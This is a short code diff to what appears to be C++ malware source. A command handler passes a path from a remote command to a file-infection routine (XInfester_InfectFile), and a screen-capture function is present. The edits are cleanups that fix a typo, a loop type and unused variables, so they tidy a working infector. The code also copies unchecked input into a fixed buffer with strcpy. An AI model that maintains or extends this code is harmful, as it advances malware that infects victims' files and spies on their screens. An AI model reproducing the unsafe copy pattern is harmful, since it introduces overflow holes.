@@ -103,7 +103,7 @@ bool  CmdProcess::SpecialCommand(char *cmd)
 			char *Dest=strtok(NULL," ");
 			char MaxPath[MAX_PATH];
 			strcpy(MaxPath,Dest);
-			for (int i=0;i<strlen(MaxPath);i++)
+			for (unsigned int i=0;i<strlen(MaxPath);i++)
 			{
 				if (MaxPath[i]=='\r'||MaxPath[i]=='\n')
 				{
@@ -128,14 +128,14 @@ bool  CmdProcess::SpecialCommand(char *cmd)
 			char *Dest=strtok(NULL," ");
 			char MaxPath[MAX_PATH];
 			strcpy(MaxPath,Dest);
-			for (int i=0;i<strlen(MaxPath);i++)
+			for (unsigned int i=0;i<strlen(MaxPath);i++)
 			{
 				if (MaxPath[i]=='\r'||MaxPath[i]=='\n')
 				{
 					MaxPath[i]='\0';
 				}
 			}
-			XInfester_InfestFile(MaxPath);
+			XInfester_InfectFile(MaxPath);
 			return true;
 		}
 	}
@@ -197,8 +197,6 @@ void ScreenCapture(LPSTR filename, WORD BitCount, LPRECT lpRect){
 	DWORD lFileSize;
 	BITMAPINFO bmInfo;
 	BITMAPFILEHEADER bmFileHeader;
-	HANDLE hbmfile;
-	DWORD dwWritten;
 
 	if (lpRect == NULL)
 	{
